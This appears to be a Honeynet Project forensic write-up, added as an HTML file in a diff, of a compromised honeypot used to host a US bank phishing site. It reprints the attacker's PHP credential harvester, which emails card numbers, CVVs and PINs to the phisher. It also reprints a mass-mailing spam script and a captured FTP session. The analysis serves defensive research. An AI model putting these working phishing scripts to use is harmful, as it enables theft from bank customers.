@@ -1,0 +1,400 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Know Your Enemy: Phishing</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link href="../phishing.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+<div id="header">
+	<h1>Know Your Enemy:<br>Phishing</h1>
+	<h3 id="subtitle">Detailed analysis of UK phishing incident content</h3>
+	<p id="metainfo">
+  <a href="mailto:project@honeynet.org?Subject=Know%20Your%20Enemy">The Honeynet
+		Project &amp; Research Alliance</a><br>
+  <a href="http://www.honeynet.org/">http://www.honeynet.org</a><br>
+  Last Modified: 16th May 2005
+</p>
+</div>
+
+<p>This honeynet was a high interaction research honeynet deployed by the UK Honeynet Project in a UK ISP data centre. After a few hours of general background network activity, the Redhat Linux 7.3 honeypot was scanned, compromised and an IRC server installed. A number of further compromises occurred, as multiple attackers located the vulnerable system and exploited it for their own purposes, before the honeypot server was used to host a phishing attack targeting a well known US bank. For brevity, this detailed analysis of the uploaded content only covers the activity relevant to the phishing attack.</p>
+
+The first zip file downloaded was bank.zip, via wget from the Romanian FTP server host2.go.ro.
+
+<pre>
+# md5sum bank.zip
+8045fd244fc96576e98a2c88b3b420b4   bank.zip
+</pre>
+
+<pre>
+# ls -l bank.zip
+-rw-r--r--    1 root     root        39988 Jul 26 10:12 bank.zip
+</pre>
+
+<pre>
+# file bank.zip
+bank.zip: Zip archive data, at least v2.0 to extract
+</pre>
+
+<p>The file was a valid zip archive, and contained the following data:</p>
+
+<pre>
+Length    Date   Time Name
+-------- ----   ----    ----
+1217      02-02-04 03:48 BankInternetBankingfiles/ConnectionSecured.gif
+483       02-02-04 03:48 BankInternetBankingfiles/EnrollToday.gif
+293       02-02-04 03:48 BankInternetBankingfiles/MemberFDIC.gif
+475       02-02-04 03:48 BankInternetBankingfiles/TakeATour.gif
+25088     02-02-04 03:48 BankInternetBankingfiles/Thumbs.db
+51        02-02-04 03:48 BankInternetBankingfiles/arrow_red.gif
+57        02-02-04 03:48 BankInternetBankingfiles/arrow_red2.gif
+1214      02-02-04 03:48 BankInternetBankingfiles/bbarleft.gif
+1318      02-02-04 03:48 BankInternetBankingfiles/bbarmiddle.gif
+2390      02-02-04 03:48 BankInternetBankingfiles/bbarright.gif
+959       02-02-04 03:48 BankInternetBankingfiles/conversionWelcome.js
+222       02-02-04 03:48 BankInternetBankingfiles/footer_curve.gif
+4527      02-02-04 03:48 BankInternetBankingfiles/global.css
+370       02-02-04 03:48 BankInternetBankingfiles/login.gif
+1489      02-02-04 03:48 BankInternetBankingfiles/logo.gif
+10519     02-02-04 03:48 BankInternetBankingfiles/logon.js
+947       02-02-04 03:48 BankInternetBankingfiles/showDemo.js
+43        02-02-04 03:48 BankInternetBankingfiles/spacer.gif
+583       02-02-04 03:48 BankInternetBankingfiles/top_nav.gif
+0         07-04-04 02:56 BankInternetBankingfiles/
+1752      07-04-04 03:19 check.php
+22085     07-04-04 03:11 index.htm
+1412      07-04-04 03:14 Scrisoare.html
+--------                 -------
+77494                    23 files
+</pre>
+
+<p>This was a pre-prepared web site that mimics the official login page for a major US bank. It included a server side PHP script called <i>check.php</i>, intended to harvest any credentials entered by an unsuspecting end user and email them to the phisher. The presence of a Thumbs.db file suggests that the contents was prepared on a MS Windows system. <i>Scrisoare</i> is the Romanian word for letter, suggesting an email or message or Romanian origin.</p>
+
+<p>Analysis of the <i>check.php</i> script (shown below) reveals that this script is a more advanced version of the script used the German phishing incident. Basic checks on the card number received have been added, along with a refinement that uses the credit card number to classify cards into different types and insert the type into the subject line of the email. This suggests basic scripting abilities and not just a simple script kiddie.</p>
+
+The <i>check.php</i> script:
+
+<pre>
+&lt;?php
+$ccnumber = $_POST['ccnumber'];
+$cvv2 = $_POST['cvv2'];
+$atm = $_POST['atm'];
+$expmonth = $_POST['expmonth'];
+$expyear = $_POST['expyear'];
+if(!$ccnumber || !$cvv || !$atm || !$expmonth || !$expyear)
+{       header("Location: http://69.44.XXX.XXX/.internet_banking_logon/RequestRouterifrequestCmdId-DisplayLoginPage/index.htm"); }
+else
+{
+ if(!ereg("^[0-9]{14,16}",$ccnumber))
+{       header("Location: http://69.44.XXX.XXX/.internet_banking_logon/RequestRouterifrequestCmdId-DisplayLoginPage/index.htm"); }
+ else
+ {
+if(!ereg("^[0-9]{3,4}",$cvv))
+{       header("Location: http://69.44.XXX.XXX/.internet_banking_logon/RequestRouterifrequestCmdId-DisplayLoginPage/index.htm"); }
+  else
+   {
+$comi="phisher@xxx.us";
+     $from_name="$first $last";
+$from_address="CC@targetbank.com";
+     $mesaj = "CreditCard Number : $ccnumber
+CVV2 : $cvv
+PIN : $atm
+Expiration Date : $expmonth - $expyear";
+     if(ereg('^4[0-9]{13,17}$', $ccnumber))
+     {  mail($comi, "BANK [VISA ]", $mesaj, "From: <{$from_address}>\r\n");}
+     else { }
+     if(ereg('^5[0-9]{13,17}$', $ccnumber))
+     {mail($comi, "BANK [MasterCard ]", $mesaj, "From: <{$from_address}>\r\n");}
+     else { }
+     if(ereg('^3[0-9]{13,17}$', $ccnumber))
+     { mail($comi, "BANK [American Express ]", $mesaj, "From: <{$from_address}>\r\n");}
+     else { }
+     if(ereg('^6[0-9]{13,17}$', $ccnumber))
+     {mail($comi, "BANK [Discover ]", $mesaj, "From: <{$from_address}>\r\n");}
+     else { }
+     echo "
+     &lt;html&gt;
+     &lt;body&gt;
+     &lt;script language='javascript'&gt;
+window.location='https://www.targetbank.com/internetBanking/RequestRouter?requestCmdId=DisplayLoginPage';
+     &lt;/script&gt;
+     &lt;/body&gt;
+     &lt;/html&gt;
+     ";
+    }
+   }
+  }
+?>
+</pre>
+
+<p>A hard coded IP address of 66.XXX.XXX.XXX was included in the original script, suggesting that the script had already been used on an alternate server (either another compromised host or a test machine local to the attacker). This IP address appears to be a home DSL IP block belonging to a US carrier and no web site is hosted there now. This script also links directly to the real target bank web site, presumably for added realism and to attempt to confuse recipients.</p>
+
+<p>The second file downloaded using FTP was bank1.tgz:</p>
+
+<pre>
+# file bank1.tgz
+bank1.tgz: gzip compressed data, from Unix
+</pre>
+
+<pre># md5sum bank1.tgz
+36ae12dcc6d36b55f5289464e092a45e bank1.tgz
+</pre>
+
+<pre>
+# ls -l bank1.tgz
+-rw-r--r--    1 root     root 36065 Aug  2 10:09 bank1.tgz
+</pre>
+
+<p>The file was a valid tgz archive, and contained the following data:</p>
+
+<pre>
+./bank
+./bank/BankInternetBankingfiles
+./bank/BankInternetBankingfiles/ConnectionSecured.gif
+./bank/BankInternetBankingfiles/EnrollToday.gif
+./bank/BankInternetBankingfiles/MemberFDIC.gif
+./bank/BankInternetBankingfiles/TakeATour.gif
+./bank/BankInternetBankingfiles/Thumbs.db
+./bank/BankInternetBankingfiles/arrow_red.gif
+./bank/BankInternetBankingfiles/arrow_red2.gif
+./bank/BankInternetBankingfiles/bbarleft.gif
+./bank/BankInternetBankingfiles/bbarmiddle.gif
+./bank/BankInternetBankingfiles/bbarright.gif
+./bank/BankInternetBankingfiles/conversionWelcome.js
+./bank/BankInternetBankingfiles/footer_curve.gif
+./bank/BankInternetBankingfiles/global.css
+./bank/BankInternetBankingfiles/login.gif
+./bank/BankInternetBankingfiles/logo.gif
+./bank/BankInternetBankingfiles/logon.js
+./bank/BankInternetBankingfiles/showDemo.js
+./bank/BankInternetBankingfiles/spacer.gif
+./bank/BankInternetBankingfiles/top_nav.gif
+./bank/popup.html
+./bank/index.htm
+</pre>
+
+<p>The attacker moved the new files into location in the web root and used the pico editor to change popup.html to point to a test server (http://69.24.XX.XX/testing.php). Again, this was possibly a previously compromised host or a system local to the attacker.</p>
+
+<p>Interestingly, because this FTP session was plain text and the attacker helpfully used the directory listing command, we can observe the attacker’s activities and also see what other tools they have stored in their FTP area. Directory listings are often very useful in providing further background detail during incident analysis:</p>
+
+<pre>
+220 Go.ro Members FTP
+
+USER xxxxxxxxx
+331 Password required for phiser.
+
+PASS xxxxxxxxx
+230 User phisher logged in.
+
+SYST
+215 UNIX Type: L8
+
+PASV
+227 Entering Passive Mode (81,196,XXX,XXX,99,226).
+
+LIST
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 free     web 1890 Jun 16 01:03 Desktop.zip
+-rw-r--r--   1 free     web 6536 Jul 19 11:26 Scrisori.zip
+-rw-r--r--   1 free     web 2788 Jun 16 18:29 bla1.txt
+-rw-r--r--   1 free     web 14834 Jun 17 13:16 ebay only
+-rw-r--r--   1 free     web 247127 Jun 14 19:58 emailer2.zip
+-rw-r--r--   1 free     web 467214 Jun 10 08:36 eros.tgz
+-rw-r--r--   1 free     web 417494 Jul 18 22:27 ex.tgz
+-rw-r--r--   1 free     web 2833 Jul 11 16:55 flit.tgz
+-rw-r--r--   1 free     web 7517 Jun 11 11:53 html1.zip
+-rw-r--r--   1 free     web 10383 Jul  3 19:07 index.html
+-rw-r--r--   1 free     web 413 Jul 18 22:09 index.zip
+drwxr-xr-x   2 free     web 54 Jul 11 04:49 listz
+-rw-r--r--   1 free     web 246920 Jun 14 20:38 massmail.tgz
+-rw-r--r--   1 free     web 8192 Jun 12 07:18 massmail.zip
+-rw-r--r--   1 free     web 0 Jun 17 10:09 neptun.tgz
+-rw-r--r--   1 free     web 310132 Jun 11 09:25 paginabuna1.tgz
+-rw-r--r--   1 free     web 54818 Jun 18 23:24 scampagededat1.zip
+-rw-r--r--   1 free     web 12163 Jun  9 01:31 send.php
+-rw-r--r--   1 free     web 2094 Jun 20 11:49 sendspamAOL1.tgz
+-rw-r--r--   1 free     web 2173 Jun 14 22:58 sendspamBUN1.tgz
+-rw-r--r--   1 free     web 2783 Jun 15 00:21 sendspamBUNzip1.zip
+-rw-r--r--   1 free     web 2096 Jun 16 18:46 sendspamNEW1.tgz
+-rw-r--r--   1 free     web 574 Jul 11 01:08 sendbank1.tgz
+-rw-r--r--   1 free     web 3238 Jul 18 23:07 sendbankNEW.tgz
+-rw-r--r--   1 free     web 64443 Jun 11 02:33 spam
+-rw-r--r--   1 free     web 83862 Jun  9 09:56 spamz.zip
+drwxr-xr-x   2 free     web 64 Jul 16 12:05 stuff
+-rw-r--r--   1 free     web 2424 Jul 19 11:27 suntrust.zip
+-rw-r--r--   1 free     web 36441 Jul 18 00:52 usNEW.zip
+-rw-r--r--   1 free     web 36065 Jul 11 17:04 bank1.tgz
+drwxr-xr-x   2 free     web 49 Jul 16 12:26 banka
+-rw-r--r--   1 free     web 301939 Jun  8 13:17 www1.tar.gz
+-rw-r--r--   1 free     web 327380 Jun  7 16:24 www1.zip
+226 Transfer complete.
+
+CWD banka
+250 CWD command successful.
+
+PASV
+227 Entering Passive Mode (81,196,XXX,XXX,115,151).
+
+LIST
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 free     web 1765 Jul   3 18:25 check.php
+-rw-r--r--   1 free     web 39988 Jul  3 18:25 bank.zip
+-rw-r--r--   1 free     web 40152 Jul 16 12:26 banka.zip
+226 Transfer complete.
+
+CWD ..
+250 CWD command successful.
+
+PASV
+227 Entering Passive Mode (81,196,XXX,XXX,133,197).
+
+LIST
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 free     web 1890 Jun 16 01:03 Desktop.zip
+-rw-r--r--   1 free     web 6536 Jul 19 11:26 Scrisori.zip
+-rw-r--r--   1 free     web 2788 Jun 16 18:29 bla1.txt
+-rw-r--r--   1 free     web 14834 Jun 17 13:16 ebay only
+-rw-r--r--   1 free     web 247127 Jun 14 19:58 emailer2.zip
+-rw-r--r--   1 free     web 467214 Jun 10 08:36 eros.tgz
+-rw-r--r--   1 free     web 417494 Jul 18 22:27 ex.tgz
+-rw-r--r--   1 free     web 2833 Jul 11 16:55 flit.tgz
+-rw-r--r--   1 free     web 7517 Jun 11 11:53 html1.zip
+-rw-r--r--   1 free     web 10383 Jul  3 19:07 index.html
+-rw-r--r--   1 free     web 413 Jul 18 22:09 index.zip
+drwxr-xr-x   2 free     web 54 Jul 11 04:49 listz
+-rw-r--r--   1 free     web 246920 Jun 14 20:38 massmail.tgz
+-rw-r--r--   1 free     web 8192 Jun 12 07:18 massmail.zip
+-rw-r--r--   1 free     web 0 Jun 17 10:09 neptun.tgz
+-rw-r--r--   1 free     web 310132 Jun 11 09:25 paginabuna1.tgz
+-rw-r--r--   1 free     web 54818 Jun 18 23:24 scampagededat1.zip
+-rw-r--r--   1 free     web 12163 Jun  9 01:31 send.php
+-rw-r--r--   1 free     web 2094 Jun 20 11:49 sendspamAOL1.tgz
+-rw-r--r--   1 free     web 2173 Jun 14 22:58 sendspamBUN1.tgz
+-rw-r--r--   1 free     web 2783 Jun 15 00:21 sendspamBUNzip1.zip
+-rw-r--r--   1 free     web 2096 Jun 16 18:46 sendspamNEW1.tgz
+-rw-r--r--   1 free     web 1574 Jul 11 01:08 sendbank1.tgz
+-rw-r--r--   1 free     web 2238 Jul 18 23:07 sendbankNEW.tgz
+-rw-r--r--   1 free     web 64443 Jun 11 02:33 spam
+-rw-r--r--   1 free     web 83862 Jun  9 09:56 spamz.zip
+drwxr-xr-x   2 free     web 64 Jul 16 12:05 stuff
+-rw-r--r--   1 free     web 2424 Jul 19 11:27 suntrust.zip
+-rw-r--r--   1 free     web 36441 Jul 18 00:52 usNEW.zip
+-rw-r--r--   1 free     web 36065 Jul 11 17:04 bank1.tgz
+drwxr-xr-x   2 free     web 49 Jul 16 12:26 banka
+-rw-r--r--   1 free     web 301939 Jun  8 13:17 www1.tar.gz
+-rw-r--r--   1 free     web 327380 Jun  7 16:24 www1.zip
+226 Transfer complete.
+
+TYPE I
+200 Type set to I
+
+PASV
+227 Entering Passive Mode (81,196,XXX,XXX,113,86).
+
+RETR bank1.tgz
+150 Opening BINARY mode data connection for bank1.tgz (36065 bytes)
+
+226 Transfer complete.
+QUIT
+
+221 Goodbye.
+</pre>
+
+<p>The contents of this FTP server home directory suggests that the phisher is heavily involved in spam and phishing activities, with pre-built content and message delivery tools targeting many well known online brands stored on this server. Based on this captured session, this phishing activity is not likely to be an isolated incident.</p>
+
+<p>The third file downloaded was sendbankNEW.tgz from the Romain FTP server host2.go.ro.</p>
+
+<pre>
+# md5sum sendbankNEW.tgz
+f38bd5496b51881ee6d13aa6f41cd156
+</pre>
+
+<pre.
+# ls -l sendbankNEW.tgz
+-rw-r--r--  1 root root 3238 Oct 31 14:56
+</pre>
+
+<pre>
+# file sendbankNEW.tgz
+sendbankNEW.tgz     gzip compressed data, from Unix
+</pre>
+
+<p>The file was a valid archive and contained the following files:</p>
+
+<pre>
+total 20
+-rw-r--r--  1 1002 1002  724 Nov  4  2003 ini.inc
+-rw-r--r--  1 1002 1002  101 Jun 14 23:44 list.txt
+-rw-r--r--  1 1002 1002  607 Jul 17 14:21 bank.php
+-rw-rw-rw-  1 root root 7564 Jul 19 00:04 bla.txt
+</pre>
+
+<p>The purpose of each file is listed in the table below:</p>
+
+<table border="0" cellpadding="0" cellspacing="3">
+  <tr>
+    <td><p><strong>File</strong></p></td>
+    <td><p><strong>Contents and purpose</strong></p></td>
+  </tr>
+  <tr>
+    <td><p>ini.inc</p></td>
+    <td><p>Spam sending configuration</p></td>
+  </tr>
+  <tr>
+		<td><p>list.txt</p></td>
+    <td><p>This file contained a list of 5 email addresses to send spam email to. Because of the limited size and Romanian email addresses linked to the attacker, this was presumably the email addresses of fellow gang members and not a real phishing attack</p></td>
+  </tr>
+  <tr>
+		<td><p>bank.php</p></td>
+		<td><p>A simple PHP script to read the contents of a text file (bla.txt) and email it to each recipient in an input file (list.txt)</p></td>
+  </tr>
+</table>
+
+<p>The email lure <i>blah.txt</i> was notable for having good grammar and spelling, legalise at the bottom about "Equal Opportunity Lending" and heavy use of files linked directly from the official web site of the targeted bank, all of which help it to appear more realistic. One ironic point to note is that the email even included an exhortation to not provide passwords to fraudulent web sites, or to ever email your password to a third party!</p>
+
+<p>The <i>bank.php</i> mass emailing script to send spam advertising this particular phishing scam is shown below:</p>
+
+<pre>
+&lt;?php
+include("ini.inc");
+$mail_header  = "From:
+
+XXXXXXXXX&lt;restore@targetbank.com&gt;\n";
+$mail_header .= "Content-Type: text/html\n";
+$subject="In attention of Target Bank Members ! Restore Your Account Now!";
+$body=loadini("bla.txt");
+if (!($fp = fopen("list.txt", "r")))
+        exit("Unable to
+
+open $listFile.");
+$i=0;
+print "Start time is "; print date("Y:m:d H:i"); print
+
+"\n";
+while (!feof($fp)) {
+        fscanf($fp, "%s", $name);
+        $i++;
+
+mail($name, $subject, $body, $mail_header);
+}
+print "End time is "; print date("Y:m:d
+
+H:i"); print "\n";
+print "$i"; print "emails sent."; print"\n";
+?>
+</pre>
+
+<p>Although simple, it is functional and could easily have been used to send many more messages than the 5 test messages sent from the honeynet. The honeynet architecture would have restricted outbound emails, but the honeypot was taken offline for forensic analysis before any bulk spam email could be sent by the attacker.</p>
+
+<p>Click <a href="../index.html">here</a> to return to the main paper.</p>
+
+</div>
+
+<p align="center"><a href="http://www.honeynet.org/"><img src="../images/small.gif"
+	alt="The Honeynet Project" width="143" height="34" border="0"></a> </p>
+
+<p>&nbsp; </p>
+</body>
+</html>
